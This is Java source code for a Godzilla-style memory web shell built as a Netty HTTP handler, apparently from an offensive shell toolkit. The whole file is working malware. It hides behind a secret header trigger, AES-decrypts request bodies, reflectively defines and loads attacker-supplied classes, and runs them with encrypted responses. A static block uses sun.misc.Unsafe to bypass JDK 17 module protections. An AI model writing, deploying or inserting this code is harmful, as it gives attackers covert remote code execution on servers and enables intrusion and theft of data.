package com.reajason.javaweb.memshell.shelltool.godzilla;

import io.netty.buffer.Unpooled;
import io.netty.channel.ChannelDuplexHandler;
import io.netty.channel.ChannelFutureListener;
import io.netty.channel.ChannelHandler;
import io.netty.channel.ChannelHandlerContext;
import io.netty.handler.codec.http.*;
import io.netty.util.CharsetUtil;

import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import java.io.ByteArrayOutputStream;
import java.lang.reflect.Field;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.net.URLDecoder;
import java.nio.charset.StandardCharsets;

/**
 * @author ReaJason
 */
@ChannelHandler.Sharable
public class GodzillaNettyHandler extends ChannelDuplexHandler {
    public static String key;
    public static String pass;
    public static String md5;
    public static String headerName;
    public static String headerValue;
    private final StringBuilder requestBody = new StringBuilder();
    private HttpRequest request;
    private static Class<?> payload;

    private static Class<?> defineClass(byte[] bytes) throws Exception {
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method method = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        method.setAccessible(true);
        return (Class<?>) method.invoke(urlClassLoader, bytes, 0, bytes.length);
    }

    public byte[] x(byte[] s, boolean m) {
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(key.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    @Override
    public void channelRead(ChannelHandlerContext ctx, Object msg) throws Exception {
        if (msg instanceof HttpRequest) {
            request = (HttpRequest) msg;
            HttpHeaders headers = request.headers();
            String value = headers.get(headerName);
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }
            // 如果是当前 payload 进来不能调用 ctx.fireChannelRead(msg)，不然的话下面不能拿到完整的 request body
        }
        if (msg instanceof HttpContent) {
            HttpContent httpContent = (HttpContent) msg;
            HttpHeaders headers = request.headers();
            String value = headers.get(headerName);

            // quick fail，防止其他哥斯拉马打进来走这个逻辑寄了
            if (value == null || !value.contains(headerValue)) {
                ctx.fireChannelRead(msg);
                return;
            }

            String content = httpContent.content().toString(CharsetUtil.UTF_8);
            requestBody.append(content);
            if (httpContent instanceof LastHttpContent) {
                try {
                    String base64Str = URLDecoder.decode(requestBody.substring(pass.length() + 1), "UTF-8");
                    requestBody.setLength(0);
                    byte[] data = x(base64Decode(base64Str), false);
                    if (payload == null) {
                        payload = defineClass(data);
                        send(ctx, "");
                        return;
                    } else {
                        Object f = payload.newInstance();
                        ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                        f.equals(arrOut);
                        f.equals(data);
                        f.toString();
                        send(ctx, md5.substring(0, 16) + base64Encode(x(arrOut.toByteArray(), true)) + md5.substring(16));
                    }
                    return;
                } catch (Exception ignored) {
                }
            }
            ctx.fireChannelRead(msg);
        }
    }

    @SuppressWarnings("all")
    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object encoder = base64.getMethod("getEncoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (String) encoder.getClass().getMethod("encodeToString", byte[].class).invoke(encoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Encoder");
                Object encoder = base64.newInstance();
                value = (String) encoder.getClass().getMethod("encode", byte[].class).invoke(encoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    @SuppressWarnings("all")
    public static byte[] base64Decode(String bs) {
        byte[] value = null;
        Class<?> base64;
        try {
            base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", (Class<?>[]) null).invoke(base64, (Object[]) null);
            value = (byte[]) decoder.getClass().getMethod("decode", String.class).invoke(decoder, bs);
        } catch (Exception var6) {
            try {
                base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[]) decoder.getClass().getMethod("decodeBuffer", String.class).invoke(decoder, bs);
            } catch (Exception ignored) {
            }
        }
        return value;
    }

    private void send(ChannelHandlerContext ctx, String context) throws Exception {
        FullHttpResponse response = new DefaultFullHttpResponse(HttpVersion.HTTP_1_1, HttpResponseStatus.OK, Unpooled.copiedBuffer(context, StandardCharsets.UTF_8));
        response.headers().set("Content-Type", "text/plain; charset=UTF-8");
        response.headers().set(HttpHeaderNames.CONTENT_LENGTH, response.content().readableBytes());
        ctx.channel().writeAndFlush(response).addListener(ChannelFutureListener.CLOSE);
    }

    static {
        // webflux3 jdk17 bypass module
        try {
            Class<?> unsafeClass = Class.forName("sun.misc.Unsafe");
            java.lang.reflect.Field unsafeField = unsafeClass.getDeclaredField("theUnsafe");
            unsafeField.setAccessible(true);
            Object unsafe = unsafeField.get(null);
            Object module = Class.class.getMethod("getModule").invoke(Object.class, (Object[]) null);
            java.lang.reflect.Method objectFieldOffsetM = unsafe.getClass().getMethod("objectFieldOffset", Field.class);
            Long offset = (Long) objectFieldOffsetM.invoke(unsafe, Class.class.getDeclaredField("module"));
            java.lang.reflect.Method getAndSetObjectM = unsafe.getClass().getMethod("getAndSetObject", Object.class, long.class, Object.class);
            getAndSetObjectM.invoke(unsafe, GodzillaNettyHandler.class, offset, module);
        } catch (Exception ignored) {
        }
    }
}